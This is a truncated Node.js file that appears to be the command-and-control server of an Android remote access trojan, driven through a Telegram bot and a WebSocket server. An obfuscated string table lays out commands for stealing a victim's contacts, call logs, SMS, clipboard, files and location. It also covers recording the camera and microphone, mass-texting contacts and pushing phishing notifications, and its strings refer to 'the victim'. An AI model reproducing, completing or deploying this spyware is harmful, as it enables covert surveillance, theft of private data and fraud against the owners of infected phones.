const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios')

const token = 'your token here'
const id = 'chat id here'
const address = 'https://www.google.com'

var _0xdc21 = ["createServer", "json", "use", "", "/", "<h1 align=\"center\">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>", "send", "get", "/uploadFile", "file", "single", "originalname", "buffer", "\xB0\u2022\x20\uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62\x20\x3C\x62\x3E", "model", "headers", "</b> 𝙙𝙚𝙫𝙞𝙘𝙚", "HTML", "application/txt", "sendDocument", "post", "/uploadText", "</b> 𝙙𝙚𝙫𝙞𝙘𝙚\\n\\n", "text", "body", "sendMessage", "/uploadLocation", "lat", "lon", "sendLocation", "\xB0\u2022\x20\uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63\x20\uD835\uDE5B\uD835\uDE67\uD835\uDE64\uD835\uDE62\x20\x3C\x62\x3E", "connection", "v4", "battery", "version", "brightness", "provider", "uuid", "set", "\xB0\u2022\x20\uD835\uDE49\uD835\uDE5A\uD835\uDE6C\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\x20\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59\x5C\x6E\x5C\x6E", "• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>", "</b>\\n", "• ʙᴀᴛᴛᴇʀʏ : <b>", "• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>", "• ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>", "• ᴘʀᴏᴠɪᴅᴇʀ : <b>", "</b>", "close", "\xB0\u2022\x20\uD835\uDE3F\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\x20\uD835\uDE59\uD835\uDE5E\uD835\uDE68\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59\x5C\x6E\x5C\x6E", "delete", "on", "message", "id", "chat", "reply_to_message", "\xB0\u2022\x20\uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE6C\uD835\uDE5D\uD835\uDE5E\uD835\uDE58\uD835\uDE5D\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE4E\uD835\uDE48\uD835\uDE4E", "includes", "\xB0\u2022\x20\uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69\x2C\x20\uD835\uDE63\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5E\uD835\uDE68\x20\uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67\x0A\x0A", "• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ", "\xB0\u2022\x20\uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69\x2C\x20\uD835\uDE63\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5E\uD835\uDE68\x20\uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67", "send_message:", "forEach", "clients", "\xB0\u2022\x20\uD835\uDE54\uD835\uDE64\uD835\uDE6A\uD835\uDE67\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE66\uD835\uDE6A\uD835\uDE5A\uD835\uDE68\uD835\uDE69\x20\uD835\uDE5E\uD835\uDE68\x20\uD835\uDE64\uD835\uDE63\x20\uD835\uDE65\uD835\uDE67\uD835\uDE64\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\x0A\x0A", "• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ", "𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨", "𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE56\uD835\uDE61\uD835\uDE61\x20\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68", "send_message_to_all:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D\x20\uD835\uDE64\uD835\uDE5B\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE59\uD835\uDE64\uD835\uDE6C\uD835\uDE63\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59", "file:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D\x20\uD835\uDE64\uD835\uDE5B\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A", "delete_file:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE5D\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE57\uD835\uDE5A\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59", "microphone:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE5D\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE56\uD835\uDE5E\uD835\uDE63\x20\uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE57\uD835\uDE5A\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59", "rec_camera_main:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE5D\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A\x20\uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE57\uD835\uDE5A\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE58\uD835\uDE64\uD835\uDE67\uD835\uDE59\uD835\uDE5A\uD835\uDE59", "rec_camera_selfie:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67\x20\uD835\uDE64\uD835\uDE63\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE56\uD835\uDE67\uD835\uDE5C\uD835\uDE5A\uD835\uDE69\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A", "toast:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67\x20\uD835\uDE56\uD835\uDE68\x20\uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63", "\xB0\u2022\x20\uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69\x2C\x20\uD835\uDE63\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE57\uD835\uDE5A\x20\uD835\uDE64\uD835\uDE65\uD835\uDE5A\uD835\uDE63\uD835\uDE5A\uD835\uDE59\x20\uD835\uDE57\uD835\uDE6E\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63\x0A\x0A", "• ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ", "\xB0\u2022\x20\uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69\x2C\x20\uD835\uDE63\uD835\uDE64\uD835\uDE6C\x20\uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE57\uD835\uDE5A\x20\uD835\uDE64\uD835\uDE65\uD835\uDE5A\uD835\uDE63\uD835\uDE5A\uD835\uDE59\x20\uD835\uDE57\uD835\uDE6E\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63", "show_notification:", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64\x20\uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE65\uD835\uDE61\uD835\uDE56\uD835\uDE6E", "play_audio:", "/start", "\xB0\u2022\x20\uD835\uDE52\uD835\uDE5A\uD835\uDE61\uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE4D\uD835\uDE56\uD835\uDE69\x20\uD835\uDE65\uD835\uDE56\uD835\uDE63\uD835\uDE5A\uD835\uDE61\x0A\x0A", "• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\x0A\x0A", "• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\x0A\x0A", "• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\x0A\x0A", "• ɪꜰ ʏᴏᴜ ɢᴇᴛ ꜱᴛᴜᴄᴋ ꜱᴏᴍᴇᴡʜᴇʀᴇ ɪɴ ᴛʜᴇ ʙᴏᴛ, ꜱᴇɴᴅ /start ᴄᴏᴍᴍᴀɴᴅ", "size", "\xB0\u2022\x20\uD835\uDE49\uD835\uDE64\x20\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5E\uD835\uDE63\uD835\uDE5C\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68\x20\uD835\uDE56\uD835\uDE6B\uD835\uDE56\uD835\uDE5E\uD835\uDE61\uD835\uDE56\uD835\uDE57\uD835\uDE61\uD835\uDE5A\x0A\x0A", "• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ", "\xB0\u2022\x20\uD835\uDE47\uD835\uDE5E\uD835\uDE68\uD835\uDE69\x20\uD835\uDE64\uD835\uDE5B\x20\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68\x20\x3A\x0A\x0A", "</b>\\n\\n", "device:", "push", "\xB0\u2022\x20\uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE58\uD835\uDE69\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE5A\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A\x20\uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE5A\uD835\uDE63\uD835\uDE59", "\xB0\u2022\x20\uD835\uDE4B\uD835\uDE5A\uD835\uDE67\uD835\uDE62\uD835\uDE5E\uD835\uDE68\uD835\uDE68\uD835\uDE5E\uD835\uDE64\uD835\uDE63\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE63\uD835\uDE5E\uD835\uDE5A\uD835\uDE59", "callback_query", "data", ":", "split", "log", "device", "\xB0\u2022\x20\uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE58\uD835\uDE69\x20\uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE5B\uD835\uDE64\uD835\uDE67\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\x20\x3A\x20\x3C\x62\x3E", "message_id", "𝘼𝙥𝙥𝙨", "apps:", "𝘿𝙚𝙫𝙞𝙘𝙚 𝙞𝙣𝙛𝙤", "device_info:", "𝙂𝙚𝙩 𝙛𝙞𝙡𝙚", "𝘿𝙚𝙡𝙚𝙩𝙚 𝙛𝙞𝙡𝙚", "𝘾𝙡𝙞𝙥𝙗𝙤𝙖𝙧𝙙", "clipboard:", "𝙈𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚", "𝙈𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖", "camera_main:", "𝙎𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖", "camera_selfie:", "𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣", "location:", "𝙏𝙤𝙖𝙨𝙩", "𝘾𝙖𝙡𝙡𝙨", "calls:", "𝘾𝙤𝙣𝙩𝙖𝙘𝙩𝙨", "contacts:", "𝙑𝙞𝙗𝙧𝙖𝙩𝙚", "vibrate:", "𝙎𝙝𝙤𝙬 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣", "𝙈𝙚𝙨𝙨𝙖𝙜𝙚𝙨", "messages:", "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚", "𝙋𝙡𝙖𝙮 𝙖𝙪𝙙𝙞𝙤", "𝙎𝙩𝙤𝙥 𝙖𝙪𝙙𝙞𝙤", "stop_audio:", "𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨", "editMessageText", "calls", "deleteMessage", "contacts", "messages", "apps", "device_info", "clipboard", "camera_main", "camera_selfie", "location", "vibrate", "stop_audio", "send_message", "\xB0\u2022\x20\uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A\x20\uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE6C\uD835\uDE5D\uD835\uDE5E\uD835\uDE58\uD835\uDE5D\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE4E\uD835\uDE48\uD835\uDE4E\x0A\x0A", "•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ", "send_message_to_all", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE56\uD835\uDE61\uD835\uDE61\x20\uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68\x0A\x0A", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D\x20\uD835\uDE64\uD835\uDE5B\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE59\uD835\uDE64\uD835\uDE6C\uD835\uDE63\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59\x0A\x0A", "• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.", "delete_file", "\xB0\u2022\x20\uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D\x20\uD835\uDE64\uD835\uDE5B\x20\uD835\uDE69\uD835\uDE5D\uD835\uDE5A\x20\uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A\x20\uD835\uDE6E\uD835\uDE64\uD835\uDE6A\x20\uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69\x20\uD835\uDE69\uD835\uDE64\x20\uD835\uDE59\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A\x0A\x0A", "• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, 